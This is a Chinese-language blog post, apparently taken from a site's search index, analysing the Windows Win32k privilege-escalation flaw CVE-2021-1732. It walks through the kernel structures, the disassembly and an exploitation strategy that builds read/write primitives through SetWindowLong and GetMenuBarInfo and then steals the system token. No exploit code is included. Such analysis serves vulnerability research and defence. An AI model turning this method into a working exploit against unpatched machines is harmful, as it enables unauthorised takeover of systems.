<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CVE-2021-1732 win32K内核提权漏洞分析</title>
    <url>/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>内存破坏类内核提权漏洞一般是由C/C++的不安全操作引发，最常见的是Win32k组件中由于Callback机制导致的UAF漏洞。Windows操作系统设计初期，Win32k子系统是在用户态的，从Windows NT4开始，这部分代码移到了内核态，内核态增加了一个Win32k.sys模块，导致3个不安全的因素1.新的系统调用（1100+syscalls）2.用户模式回调（User-mode Callback）3.用户态和内核态之间的共享数据（Share data）。win32k是微软Windows子系统的图形GUI组件，该组件被用于Windows操作系统桌面的图形打印。由于win32k架构的原因，win32k的内核组件需要通过用户模式回调函数对用户模式下的代码进行调用，方便窗口的创建和管理。Win32k内核函数（如xxxCreateWindowEx）会通过用户进程PEBKernelCallBackTable生成回调函数（如xxxClientAllocWindowClassExtraBytes）,当用户模式回调函数完成后，会执行NtCallbackReturn将预期的返回参数传回内核，由于这些回调函数无状态特性，可以造成许多与对象锁定机制有关的漏洞。Win32k漏洞通常会利用tagWND数据结构的桌面对象，然后借助内核读写原语转化为纯数据攻击。</p>
<p>纯数据攻击（data-only attacks）过程通常分为两步：</p>
<ul>
<li><p>发现漏洞</p>
</li>
<li><p>使用对象字段（如tagWND.cbWndExtra）上特定OS API来利用现有的或新的读写原语。</p>
<p>tagWND数据结构有两个字段tagWnd.cbWndExtra和tagWND.ExtraBytes。当CreateWindowEx创建窗口时，可以注册窗口类时通过WNDCLASSEXA结构体中的cbWndExtra字段直接从内存中的tagWND对象之后请求额外的内存字节。额外的字节数是由cbWndExtra字段控制的，保存在ExtraBytes字段中。读写源于创建过程如下：</p>
<p>1.找到一个用于对内存中名为 WND0的tagWND对象执行写操作的漏洞（如UAF）。</p>
<p>2.在内存中先前破坏的WND0附近分配另一个名为WND1的tagWN对象</p>
<p>3.Wnd0.cbwndextra覆盖为一个非常大的值，如0xFFFFFFF</p>
<p>4.在WND0上调用一个API，比如SetWindowLongPtr,以越界写入WND1中的相关字段。</p>
</li>
</ul>
<p>多种利用Win32k内核的用户模式回调函数的漏洞例如CVE-2014-4113、CVE-2015-0057、CVE-2016-7255、CVE-2019-0808漏洞，都是利用Windows内核的tagWND读写功能来实现提权的。</p>
<p><strong>创建窗口相关的结构体和函数</strong></p>
<p>创建窗口函数：CreatWindowEx</p>
<p>用户态的窗口数据结构体：WNDCLASSEX</p>
<p>窗口类扩展内存大小：cbClsExtra</p>
<p>窗口扩展内存大小：cbWndExtra</p>
<p>窗口数据保存在内核态使用的结构体：tagWND和tagWNDK</p>
<p>用户态调用SetWindowLong可以设置窗口扩展内存数据</p>
<p>tagWnd:是Windows内核用来描述用户创建的窗口的内核数据结构，保存着窗口相关的所有信息。</p>
<p>tagBody:tagWND+0x28处的值，保存着tagWND的主体信息，由于Win32k TypeIsolation的作用，Windows内核将大部分User Object和Gdi Object,比如Window、Bitmap、Palette等对象头和对象主体之间分别从不同的位置开辟空间。</p>
<p><strong>tagWNDCLASSEXW</strong></p>
<pre class="line-numbers language-none"><code class="language-none">typedef struct tagWNDCLASSEXW {
    UINT        cbSize;        // 该结构体的大小，通过这个字段来区分桌面开发的新旧版本
    /* Win 3.x */
    UINT        style;         // 窗口类的风格
    WNDPROC     lpfnWndProc;   // 窗口的消息处理函数
    int         cbClsExtra;    // 窗口类的扩展内存大小
    int         cbWndExtra;    // 窗口的扩展内存大小
    HINSTANCE   hInstance;     // 该窗口类的窗口消息处理函数所属的应用实例
    HICON       hIcon;         // 该窗口类所用的图标
    HCURSOR     hCursor;       // 该窗口类所用的光标
    HBRUSH      hbrBackground; // 该窗口类所用的背景刷
    LPCWSTR     lpszMenuName;  // 该窗口类所用的菜单资源
    LPCWSTR     lpszClassName; // 该窗口类的名称
    /* Win 4.0 */
    HICON       hIconSm;       // 该窗口类所用的小像标
} WNDCLASSEXW;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在用户态创建窗口时，需要调用RegisterClass注册窗口类，每个窗口类有自己的名字，调用CreateWindow创建窗口时传入类的名字，即可创建对应的窗口实例。<br>当cbWndExtra不为0时，系统会申请一段对应大小的空间，如果回调到用户态申请空间时，可能会触发漏洞。</p>
<p><strong>tagWND</strong></p>
<pre class="line-numbers language-none"><code class="language-none">ptagWND             //内核中调用ValidateHwnd传入用户态窗口句柄可返回此数据指针
    0x18 unknown
        0x80 kernel desktop heap base   //内核桌面堆基址
    0x28 ptagWNDk  
    0xA8 spMenu<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>tagWNDK</strong></p>
<pre class="line-numbers language-none"><code class="language-none">struct tagWNDK
{
    ULONG64 hWnd;               //+0x00
    ULONG64 OffsetToDesktopHeap;//+0x08 tagWNDK相对桌面堆基址偏移
    ULONG64 state;              //+0x10
    DWORD dwExStyle;            //+0x18
    DWORD dwStyle;              //+0x1C
    BYTE gap[0x38];
    DWORD rectBar_Left;         //0x58
    DWORD rectBar_Top;          //0x5C
    BYTE gap1[0x68];
    ULONG64 cbWndExtra;         //+0xC8 窗口扩展内存的大小
    BYTE gap2[0x18];
    DWORD dwExtraFlag;          //+0xE8  决定SetWindowLong寻址模式
    BYTE gap3[0x10];            //+0xEC
    DWORD cbWndServerExtra;     //+0xFC
    BYTE gap5[0x28];
    ULONG64 pExtraBytes;    //+0x128 模式1：内核偏移量 模式2：用户态指针
};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>当WNDCLASSEXW 中的cbWndExtra值不为0时，创建窗口时内核会回调到用户态函数USER32!_xxxClientAllocWindowClassExtraBytes申请一块cbWndExtra大小的内存区域，并且将返回地址保存在tagWNDK结构体的pExtraBytes变量中。</p>
<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>CVE-2021-1732是Windows Win32k组件驱动模块Win32kfull.sys(Windows内核用来实现图形化系统的核心驱动程序)的LPE漏洞，由于创建窗口时调用win32kfull!xxxCreateWindowEx过程中会进行用户模式回调（KeUserModeCallback）,从而给了用户态进程利用的机会。该漏洞由安恒信息在2020年12月捕获，在2021年2月公开披露，相关样本在蔓玲花（BITTER）APT组织在某次被披露的攻击行动中使用，可以在本地将普通用户进程权限提升为system权限。</p>
<p>漏洞类型：Type Confusion(类型混淆漏洞)</p>
<p>影响版本：</p>
<pre class="line-numbers language-none"><code class="language-none">Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows Server, version 2004 (Server Core installation)
Windows 10 Version 2004 for x64-based Systems
Windows 10 Version 2004 for ARM64-based Systems
Windows 10 Version 2004 for 32-bit Systems
Windows Server, version 1909 (Server Core installation)
Windows 10 Version 1909 for ARM64-based Systems
Windows 10 Version 1909 for x64-based Systems
Windows 10 Version 1909 for 32-bit Systems
Windows Server 2019 (Server Core installation)
Windows Server 2019
Windows 10 Version 1809 for ARM64-based Systems
Windows 10 Version 1809 for x64-based Systems
Windows 10 Version 1809 for 32-bit Systems
Windows 10 Version 1803 for ARM64-based Systems
Windows 10 Version 1803 for x64-based Systems<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>用户态进程在调用CreateWindowEx创建的带有扩展内存的windows窗口时，内核态图形驱动win32full.sys模块的xxxCreateWindowEx函数会通过nt!KeUerModeCallback回调机制调用用户态函数user32!_xxxClientAllocWindowClassExtraBytes,向内核返回用户态创建的窗口扩展内存。该返回值的解释由窗口对应tagWND结构体的dwExtarFlag字段规定，如果dwExtraFlag包含0x800属性，返回值被视作相对内核桌面堆起始地址的偏移。攻击者可以hook user32!xxxClientAllocWindowClassExtraBytes函数，通过一些手段使得dwExtarFlag包含0x800属性，然后直接调用dtdll!NtCallbackReturn向内核返回一个任意值。回调结束后，dwExtraFlag不会被清除，未经效验的返回值直接被用于堆内存寻址（桌面堆起始地址+返回值），引发内存越界访问，攻击者通过构造和api封装，获得内存读写能力，最后复制system进程的token到进程完成提权。</p>
<p>正常逻辑：<br>1.CreateWindowsEx会调用内核函数xxxCreateWindowEx来实现窗口创建。</p>
<p>2.xxxCreateWindowEx内部会调用xxxClientAllocWindowClassExtraBytes来创建额外的空间，之后将返回的地址保存在tagBody+0x128处</p>
<p>3.xxxClientAllowWindowClassExtraBytes会切换到用户带执行开辟空间的动作，空间申请完成后，调用NtCallbackReturn返回到内核执行点继续执行。</p>
<p>漏洞逻辑：<br>漏洞发生在第二步，返回用户态执行开辟空间的代码中，若此时调用NtUserConsoleControl</p>
<p>1.NtUserConsoleControl内部会修改tagBody+0xE8处的Flag，通过逻辑或其他方式添加0x800标志，*(tagBody+0xE8) | =0x800</p>
<p>2.0x800这个标志tagBody+0x128处保存的值是否一个相对偏移，若是，则值为相对DesktopHeap基址的偏移，若不是，则保存用户态的地址。</p>
<p>3.标志位的修改，导致后续对tagBody+0x128处的值被作为偏移来使用，最终在xxxDestroyWindow发生使用，从而产生崩溃。</p>
<h3 id="win32kfull-xxxCreateWindowEx"><a href="#win32kfull-xxxCreateWindowEx" class="headerlink" title="win32kfull!xxxCreateWindowEx"></a>win32kfull!xxxCreateWindowEx</h3><p><strong>传入tagWND -&gt; cbwndExtra 到 xxxClientAllowWindowClassExtraBytes,在xxxClientAllowWindowClassExtraBytes执行后返回pExtraBytes</strong></p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809094750991.png"></p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809094809198.png"></p>
<p>判断tagWND -&gt; cbWndExtra不为0</p>
<pre class="line-numbers language-none"><code class="language-none">.text:00000001C0079F81                 call    ??9?$RedirectedFieldcbwndExtra@H@tagWND@@QEBAEAEBH@Z ; tagWND::RedirectedFieldcbwndExtra&lt;int&gt;::operator!=(int const &amp;)
.text:00000001C0079F86                 test    al, al       ;判断   
.text:00000001C0079F88                 jz      short loc_1C0079FD4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>传入参数cbWndExtra后调用xxxClientAllocWindowClassExtraBytes</p>
<pre class="line-numbers language-none"><code class="language-none">.text:00000001C0079F8A                 mov     rax, [r15+28h]  ; 进入ptagWNDK
.text:00000001C0079F8E                 mov     ecx, [rax+0C8h] ; 传参cbWndExtra
.text:00000001C0079F94                 call    xxxClientAllocWindowClassExtraBytes;调用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>将xxxClientAllocWindowClassExtraBytes返回值传到tagWND -&gt; pExtraBytes</p>
<pre class="line-numbers language-none"><code class="language-none">.text:00000001C0079F99                 mov     rcx, rax  ; 返回值到rcx
.text:00000001C0079F9C                 mov     rax, [r15+28h] ; 进入tagWNDK
.text:00000001C0079FA0                 mov     [rax+128h], rcx ; 将返回值赋值到tagWNDK+0x128处<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="win32kfull-xxxClientAllocWindowClassExtraBytes"><a href="#win32kfull-xxxClientAllocWindowClassExtraBytes" class="headerlink" title="win32kfull!xxxClientAllocWindowClassExtraBytes"></a>win32kfull!xxxClientAllocWindowClassExtraBytes</h3><p><strong>win32kfull!xxxCreateWindowEx载入了一个cbwndExtra，然后回调用户层user32!xxxClientAllowWindowClassExtraBytes返回了pExtraBytes然后传回win32kfull!xxxCreateWindowEx,用于赋值pExtraBytes</strong></p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809094902175.png"></p>
<p>KeUserModeCallback使用编号123回调且传入参数cbwndExtra到用户层user32.dll中的KernelCallbackTable表中user32!xxxClientAllocWindowClassExtraBytes函数,从user32!xxxClientAllocWindowClassExtraBytes调用NtCallbackReturn，返回数据有返回数据outputbuffer和返回数据长度outputlength,outputlength长度是0x18,MmUserProbeAddress会判断返回的内存outputbuffer是否越界，MmUserProbeAddress == 0xfff0000表示用户层边界，v5 = PsGetCurrentProcessWow64Process();返回的指针第一个只想用户层分配内存的地址，使用ProbeForRead判断用户层返回的内存是否是Ring3内存。v4是将要载入的pExtraBytes的内存地址。</p>
<h3 id="user32-xxxClientAllocWindowClassExtraBytes"><a href="#user32-xxxClientAllocWindowClassExtraBytes" class="headerlink" title="user32!_xxxClientAllocWindowClassExtraBytes"></a>user32!_xxxClientAllocWindowClassExtraBytes</h3><p><strong>用户层申请一个堆地址后将地址回调到内核层执行</strong></p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809094918422.png"></p>
<p>RtlAllocateHeap分配了一个内存并返回这个内存的地址。NtCallbackReturn传输了长度0x18的数据到内核层，win32kfull!xxxClientAllocWindowClassExtraBytes作为参数继续运行，长度为0x18数据的第一个8字节长度数据是分配后的地址。</p>
<h3 id="win32kfull-NtUserConsoleControl"><a href="#win32kfull-NtUserConsoleControl" class="headerlink" title="win32kfull!NtUserConsoleControl"></a>win32kfull!NtUserConsoleControl</h3><p><strong>实质作用是调用xxxConsoleControl,将结果保存在Process_Info中，当ControlCode==6时，会来到xxxConsoleControl</strong></p>
<p><strong>指定窗口hwnd的dwExtraFlag包含0x800属性</strong></p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809094948239.png"></p>
<p>参数1：功能序号，小于等于6</p>
<p>参数2：输入信息，是hook调用NtUserConsoleControl需要获取的HWND</p>
<p>参数3：输入信息长度，需要小于等于0x18</p>
<h3 id="win32kfull-xxxConsoleControl"><a href="#win32kfull-xxxConsoleControl" class="headerlink" title="win32kfull!xxxConsoleControl"></a>win32kfull!xxxConsoleControl</h3><p><strong>当flag为0x800直接调用offset寻址，当flag不是0x800会生成一个新内存，把这个内存地址设置为offset再寻址</strong></p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095011415.png"></p>
<p>判断tagWND -&gt; dwExtraFlag是否包含0x800属性。包含0x800时，会重新分配桌面堆，并将偏移0x128保存的分配地址内存pExtrabytes变成了内核桌面地址+offset寻址；不包含0x800就会重新分配内存并设置偏移0x128为offset寻址，将新生成的pExtrabytes赋值cbWndExtra大小到offset寻址内存处。(这些会直接影响SetWindowLong系列函数对窗口的设置)</p>
<p><strong>只要调用了win32kfull!NtConsoleControl就能将dwExtraFlag添加0x800属性。</strong></p>
<h3 id="user32-SetWindowLong"><a href="#user32-SetWindowLong" class="headerlink" title="user32!SetWindowLong"></a>user32!SetWindowLong</h3><p><strong>setWindowLong只需要传入3个参数</strong></p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095024069.png"></p>
<h3 id="win32kfull-NtSetWindowLong"><a href="#win32kfull-NtSetWindowLong" class="headerlink" title="win32kfull!NtSetWindowLong"></a>win32kfull!NtSetWindowLong</h3><p>*<em>在调用NTSetWindowLong函数时，会调用User32!SetWindowLong，然后传递参数到内核层中的Win32kfull!NtSetWindowLong中调用，，当flag=0x800时，将参数3写入参数2 + <em>（tagWND+0xFC)+内核桌面堆地址+pExtraBytes）指向的地址，进而导致越界写入</em></em></p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095053503.png"></p>
<p>user32!SetWindowLong传到内核层的参数，a4固定为1，获取到tagWND句柄，将调用user32!SetWindowLong传入的参数加载到xxxSetWindowLong中继续执行。</p>
<h3 id="win32kfull-xxxSetWindowLong"><a href="#win32kfull-xxxSetWindowLong" class="headerlink" title="win32kfull!xxxSetWindowLong"></a>win32kfull!xxxSetWindowLong</h3><p>参数a1是hWnd</p>
<pre class="line-numbers language-none"><code class="language-none">__int64 __fastcall xxxSetWindowLong(struct tagWND *a1, int a2, unsigned int a3, __int64 a4, int a5)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>v13指向tagWND中的ptagWNDK</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095109445.png"></p>
<p>设置新指针v14指向v13</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095122630.png"></p>
<p>v15是tagWNDK+0xFC,传入的nIndex+4必须小于tagWND+0xFC指向的地址内容</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095140302.png"></p>
<p>指针v18是传入的参数2（v15指向的ptagWNDK+0xFC）之后判断tagWNDK -&gt; flag是有0x800属性，v20指向*(pExtraBytes+载入的参数2+内核参数地址)，offset可以使用SetWindowLong自定义。</p>
<p><strong>标记了0x800，采用桌面堆+偏移的方式写入NewLong；没有标记0x800，直接在tag-&gt;WndExtraBytes写入NewLong</strong></p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095153990.png"></p>
<h3 id="win32kfull-xxxSetWindowLongPtr"><a href="#win32kfull-xxxSetWindowLongPtr" class="headerlink" title="win32kfull!xxxSetWindowLongPtr"></a>win32kfull!xxxSetWindowLongPtr</h3><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220810113654553.png"></p>
<p>当nIndex = 0, tag-&gt;ExtraBytes写入NewLong;</p>
<p>当nIndex&gt;0且nIndex&lt;0xfffffffffffffee0-8,设置tagWnd-&gt;ExtraBytes</p>
<p>当nIndex&lt;0时调用xxxSetWindowData</p>
<p>SetWindowLongPtr调用xxxSetWindowData执行特定的堆spmenu赋值功能。xxxSetWindowLongPtr需要满足以下条件跳转到xxxSetWindowData</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095208918.png"></p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095221101.png"></p>
<h3 id="win32kfull-xxxSetWindowData"><a href="#win32kfull-xxxSetWindowData" class="headerlink" title="win32kfull!xxxSetWindowData"></a>win32kfull!xxxSetWindowData</h3><p><strong>tagWNDK-&gt;style包含WS_CHILD,tagWND-&gt;spMenu=NewLong</strong></p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220810140319032.png"></p>
<p>tagWNDK-&gt;style需要包含WS_CHILD</p>
<p>将参数dwNewLong数据覆盖到(tagWND-&gt;spmenu)</p>
<h3 id="CreateWindowEx生成HWND"><a href="#CreateWindowEx生成HWND" class="headerlink" title="CreateWindowEx生成HWND"></a>CreateWindowEx生成HWND</h3><p>CreateWindowEx调用内核xxxCreateWindowEx函数</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220810141650800.png"></p>
<p>HMAllocObject中的CurThread_1表示当前线程信息，rdesk是ptiCurrent-&gt;rdesk.</p>
<p>Type为是windows，WndObject是tagWND</p>
<p>Typew等于1时，采用桌面堆进行分配</p>
<h3 id="win32kfull-CreateMenu"><a href="#win32kfull-CreateMenu" class="headerlink" title="win32kfull!CreateMenu"></a>win32kfull!CreateMenu</h3><p><strong>调用流程：CreateMenu -&gt; NtUserCallNoParam -&gt; apfnSimpleCall -&gt; InternalCreateMenu</strong></p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220810150749209.png"></p>
<h3 id="win32kfull-InternalCreateMenu"><a href="#win32kfull-InternalCreateMenu" class="headerlink" title="win32kfull!InternalCreateMenu"></a>win32kfull!InternalCreateMenu</h3><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220810151048062.png"></p>
<h3 id="win32kfull-InitLookAsideRef"><a href="#win32kfull-InitLookAsideRef" class="headerlink" title="win32kfull!InitLookAsideRef"></a>win32kfull!InitLookAsideRef</h3><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220810151401258.png"></p>
<h3 id="user32-GetMenuBarInfo"><a href="#user32-GetMenuBarInfo" class="headerlink" title="user32!GetMenuBarInfo"></a>user32!GetMenuBarInfo</h3><p>xxxGetMenuBarInfo有NtUserGetMenuBarInfo调用，NtUserGetMenuBarInfo对应的用户态函数是GetMenuBarInfo</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095255357.png"></p>
<p>将参数传入内核层NtUserGetMenuBarInfo中继续运行</p>
<h3 id="win32kfull-NtUserGetMenuBarInfo"><a href="#win32kfull-NtUserGetMenuBarInfo" class="headerlink" title="win32kfull!NtUserGetMenuBarInfo"></a>win32kfull!NtUserGetMenuBarInfo</h3><p>读原语的主要调用函数，只要在窗口内部使用根据漏洞构造的写原语将我们自定义的spmenu插入即可</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095309342.png"></p>
<h3 id="win32kfull-xxxGetMenuBarInfo"><a href="#win32kfull-xxxGetMenuBarInfo" class="headerlink" title="win32kfull!xxxGetMenuBarInfo"></a>win32kfull!xxxGetMenuBarInfo</h3><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095326320.png"></p>
<p>87:idObject必须要等于-3才能调用spmenu</p>
<p>95:赋值tagWND-&gt;spmenu到v58</p>
<p>107:传入的idItem必须大于0</p>
<p>109:获取ptagWNDK</p>
<p>112:当idItem为1,v38==v37==tagWND -&gt; spmenu + 0x58</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095338829.png"></p>
<p><strong>GetMenuBarInfo需要满足：</strong></p>
<p>1.idObject = -3</p>
<p>2.tagWnd -&gt; style包含WS_CHLD</p>
<p><strong>BarInfo是调用GetMenuBarInfo的最后的参数，保存着Menu的信息</strong></p>
<p>BarInfo -&gt; rcBar.left = pMenu -&gt; left + tagWnd -&gt;left</p>
<p>BarInfo -&gt; rcBar.right = pMenu -&gt; left + tagWnd -&gt; left + pMenu -&gt; right</p>
<h2 id="0x02漏洞利用"><a href="#0x02漏洞利用" class="headerlink" title="0x02漏洞利用"></a>0x02漏洞利用</h2><p>漏洞发生在Windows 图形驱动win32kfull!NtUserCreateWindowEx中一处由回调用户态导致offset可以自定义写入，而存在写入API在flag|0x800下越界写入offset指向地址导致的漏洞。</p>
<p>1.当驱动win32kfull.sys调用NtUserCreateWindowEx调用的xxxCreateWindowEx在调用xxxClientAllocWindowClassExtraBytes创建带窗口扩展内存的窗口时会判断tagWND­-&gt;cbWndExtra(窗口实例额外分配内存数)，该值不为空时调用win32kfull!xxxClientAllocWindowClassExtraBytes中的KeUserModeCallback函数回调系统调用表用户层user32!__xxxClientAllocWindowClassExtraBytes在用户层内存创建窗口扩展内存。</p>
<p>2.用户层创建的窗口扩展内存后分配的地址使用NtCallbackReturn函数修正堆栈后重新返回内核层并保存并继续运行，而当tagWND­-&gt;flag值包含0x800属性时候调用该值的offset进行寻址。攻击者可在回调函数内调用NtUserConsoleControl并传入当前窗口的句柄，将当前窗口内核结构中的一个成员(用于指明窗口扩展内存的区域)修改为offset，并修改相应的flag为0x800，指明该成员是一个offset。</p>
<p>3.攻击者可在回调函数中Hook位于user32.dll中的xxxClinetAllocWindowClassExtraBytes函数,在其调用的NtUserConsoleControl设置的窗口标志包含0x800属性，接着调用NtCallbackReturn返回任意值保存在tagWnd -&gt; ExtraBytes中，后续利用SetWindowLong系列函数时，将采用DeskHeap+offset的方式设置tagWnd-&gt;ExtraBytes，突破SetWindowLong长度限制，实现hWndMin越界写hWndMax写原语。获取读原语需要利用tagMenu,通过写源于修改tagWnd -&gt; spMenu为伪造的tagMenu，利用GetMenuBarInfo实现任意读。</p>
<p><strong>关键点:</strong></p>
<p>1.xxxCreateWindowEx回调用户态过程中存在Hook回调表自定义offset写入内核问题</p>
<p>2.NtUserConsoleControl设置flag这个功能与`SetWindowLong/SetWindowLongStr存在类型混淆问题</p>
<h3 id="tagWND结构体"><a href="#tagWND结构体" class="headerlink" title="tagWND结构体"></a>tagWND结构体</h3><pre class="line-numbers language-none"><code class="language-none">tagWND
    0x10 unknown
        0x00 pTEB
            0x220 pEPROCESS(of current process)
    0x18 unknown
        0x80 kernel desktop heap base
    0x28 tagWNDk(Mapped to user layer)  &lt;-----这个结构体映射到用户层
        0x00 hwnd
        0x08 kernel desktop heap base offset
        0x18 dwStyle
        0x28 Program entry 
        0x58 indow Rect top
        0x5C indow Rect left
        0x60 Window Rect buttom
        0x64 indow Rect right
        0x98 spMenu
        0xC8 cbWndExtra             长度值
        0xE8 dwExtraFlag            flag
        0xFC unknown
        0x128 pExtraBytes           内存地址
    0xA8 spMenu
        0x28 unknown
            0x2C unknown
        0x40 unknown
            0x44 unknown
        0x44 unknown
        0x58 unknown<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="内核状态下窗口句柄地址"><a href="#内核状态下窗口句柄地址" class="headerlink" title="内核状态下窗口句柄地址"></a>内核状态下窗口句柄地址</h3><p>win32kfull!NtUserSetWindowLongPtr中存在利用ValidateHwndEx返回内核下的ptagWND地址的操作。</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095353261.png"></p>
<p>rdi寄存器储存的数据是ptagWND</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095407413.png"></p>
<p>搜索win32kfull!NtUserSetWindowLong地址,定位目标汇编位置</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095421319.png"></p>
<p>地址是fffffe23`0941c660，下断运行exp,查看rdi</p>
